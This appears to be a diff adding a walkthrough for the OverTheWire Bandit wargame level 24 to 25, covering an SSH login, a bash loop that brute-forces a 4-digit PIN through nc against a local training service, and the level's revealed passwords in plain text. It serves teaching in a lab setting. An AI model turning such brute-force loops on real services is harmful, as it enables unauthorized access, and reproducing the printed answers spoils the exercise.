@@ -1,0 +1,39 @@
+🎯 Objective:
+      Find the 4-digit PIN required by a service running on a local port. You must brute-force it.
+
+Steps to be followed:
+
+Step 1: Login as bandit24
+
+ssh bandit24@bandit.labs.overthewire.org -p 2220
+Password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+Step 2: Understand the challenge
+
+There is a service listening on port 30002:
+It expects: bandit24_password + space + 4-digit PIN
+If the PIN is correct → it returns the bandit25 password
+
+Step 3: Create a brute-force script
+
+Create a script file: nano brute.sh
+Type this:
+'['
+for pin in {0000..9999}
+do
+  echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $pin"
+done | nc localhost 30002
+']' (type only the content inside the '[')
+(Then) Save & exit. Make it executable:
+
+Command: chmod +x brute.sh
+
+Step 4: Run the brute-force
+
+Command: ./brute.sh
+Wait a few seconds. Eventually, you’ll see output like: Correct!
+After that the password will be displayed.
+
+Output:
+
+Password for Level 25: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
